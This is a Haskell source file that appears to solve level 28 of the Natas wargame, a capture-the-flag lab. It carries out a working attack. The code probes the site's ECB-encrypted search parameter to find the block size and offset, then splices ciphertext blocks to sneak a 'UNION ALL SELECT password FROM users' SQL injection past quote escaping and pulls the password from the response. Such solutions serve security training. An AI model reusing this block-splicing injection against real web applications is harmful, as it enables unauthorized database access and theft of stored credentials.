{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas28 where

import           Data.ByteString        (ByteString)
import qualified Data.ByteString        as B
import           Data.ByteString.Base64 (decodeLenient, encode)
import           Data.List              (findIndex)
import           Data.Text              (Text)
import qualified Data.Text              as T
import           Data.Text.Encoding     (decodeUtf8, encodeUtf8)
import           Safe                   (headMay, lastMay)

import           Network.HTTP.Types.URI (urlDecode)
import           Network.Wreq           (param, partText, redirects,
                                         responseHeader)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  Just blocksize <- calculateBlockSize
  Just offset <- calculateBlockOffset blocksize
  payload <- injectSqlPayload blocksize offset
  req <-
    getLevel'
      28
      (parentUri 28 ++ "/search.php")
      (param "query" .~ [recode payload])
  attemptParse (reqBody req)

injectSqlPayload :: Int -> Int -> IO ByteString
injectSqlPayload blocksize offset = do
  let sql = " UNION ALL SELECT password FROM users -- "
      leftpad = T.replicate offset "X"
      rightpad = T.replicate (blocksize - (T.length sql `mod` blocksize)) "X"
      plaintext = T.concat [leftpad, sql, rightpad]
  -- we pad with 2 fewer because single quote gets escaped to "\'"
  fcaught <-
    retrieveEncoded (T.concat [leftpad, T.replicate (blocksize - 2) "X"])
  scaught <- retrieveEncoded plaintext
  let encrypted =
        (B.take (T.length plaintext - offset) . B.drop (3 * blocksize)) scaught
      payload =
        B.concat
          [ B.take (4 * blocksize) fcaught
          , encrypted
          , B.drop (4 * blocksize) fcaught
          ]
  pure payload

recode :: ByteString -> Text
recode = decodeUtf8 . encode

retrieveEncoded :: Text -> IO ByteString
retrieveEncoded submitText = do
  let req =
        postLevel'
          28
          (parentUri 28)
          (redirects .~ 0)
          (partText "query" submitText)
  Just caught <- catchResponseHandler extract req
  pure caught
  where
    extract =
      fmap (decodeLenient . encodeUtf8) .
      headMay .
      drop 1 .
      T.splitOn "query=" .
      decodeUtf8 . urlDecode True . view (responseHeader "Location")

calculateBlockSize :: IO (Maybe Int)
calculateBlockSize = do
  emptyString <- retrieveEncoded ""
  oneString <- retrieveEncoded "X"
  let findCommon x y = length (takeWhile id (B.zipWith (==) x y))
      possibleLength = findCommon emptyString oneString
  resps <-
    traverse retrieveEncoded (fmap (`T.replicate` "X") [0 .. possibleLength])
  let matchLengths = zipWith findCommon resps (drop 1 resps)
      blockSize =
        (headMay . dropWhile (== 0) . fmap (subtract possibleLength))
          matchLengths
  pure blockSize

calculateBlockOffset :: Int -> IO (Maybe Int)
calculateBlockOffset blocksize = do
  let findCommon x y = length (takeWhile id (B.zipWith (==) x y))
  resps <- traverse retrieveEncoded (fmap (`T.replicate` "X") [0 .. blocksize])
  let matchLengths = zipWith findCommon resps (drop 1 resps)
      offset = findIndex (/= head matchLengths) matchLengths
  pure offset

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = lastMay (workupBody' (filter (not . null)) body)
  in pure $ match >>= lastMay
